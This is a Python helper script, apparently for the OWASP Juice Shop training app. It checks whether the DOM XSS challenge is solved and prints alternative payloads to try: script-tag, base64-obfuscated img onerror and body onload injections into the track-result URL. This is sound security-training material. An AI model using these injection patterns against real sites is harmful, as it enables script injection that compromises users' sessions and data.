#!/usr/bin/env python3
"""
Check if DOM XSS challenge is solved and try alternative methods
"""

import requests
import json

def check_challenge_status():
    """Check if DOM XSS is already solved"""
    
    base_url = "https://juice3.wonkatech.org"
    
    # Get all challenges
    r = requests.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        
        # Find DOM XSS challenge
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if dom_xss:
            challenge = dom_xss[0]
            if challenge.get('solved'):
                print("✅ DOM XSS Challenge is ALREADY SOLVED!")
                return True
            else:
                print("❌ DOM XSS Challenge is NOT solved yet")
                return False
        
        # Count total solved
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Current Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55-len(solved)} more for 50%")
    
    return False

if __name__ == "__main__":
    print("="*60)
    print("🔍 CHECKING DOM XSS STATUS")
    print("="*60)
    
    if not check_challenge_status():
        print("\n" + "="*60)
        print("💡 ALTERNATIVE SOLUTIONS TO TRY")
        print("="*60)
        
        print("\nSince the alert isn't working, try these:")
        
        print("\n1. Try with a different browser (Chrome/Firefox)")
        print("   Some browsers block inline event handlers")
        
        print("\n2. Try this manual approach:")
        print("   a. Go to: https://juice3.wonkatech.org/#/track-result")
        print("   b. In the URL bar, manually add: ?id=<script>alert(1)</script>")
        print("   c. Press Enter")
        
        print("\n3. Try with base64 encoding:")
        print("   In console: location='#/track-result?id=<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>'")
        
        print("\n4. Try with different event:")
        print("   In console: location='#/track-result?id=<body onload=alert(1)>'")
        
        print("\n5. Check if popups are blocked:")
        print("   Your browser might be blocking popups. Check the address bar for a blocked popup icon.")